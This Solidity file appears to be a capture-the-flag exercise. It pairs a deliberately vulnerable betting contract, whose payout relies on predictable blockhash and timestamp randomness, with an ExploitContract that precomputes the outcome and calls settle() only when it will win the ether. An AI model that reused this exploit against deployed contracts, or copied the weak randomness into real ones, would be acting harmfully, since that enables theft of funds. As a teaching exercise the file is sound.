// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;
    uint8 guessNumberTest;    

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below
    /**
        1.set the guess while call the  predictTheFuture.                               setGuess(guessNumber)
        2.wait the right time while block.number and block.timestampe passed            
        3.verify the block.number and block.timestampe is Ok, then execute the exploit()
        4.should make the ExploitContract can received the eth, add the fallback function.
     */

    // set the guess
    function setGuess(uint8 guessNumber) public {
        guessNumberTest = guessNumber;
        predictTheFuture.lockInGuess{value: 1 ether}(guessNumber);
    }

    function exploit() public {
        // after set the guess, hack the settle
        if (checkTheRightTime()) {
            predictTheFuture.settle();
        }
    }

    function checkTheRightTime() internal view returns (bool) {
        return guessNumberTest
            == uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
    }

    // make the ExploitContract can receive the eth
    fallback() external payable {}
}
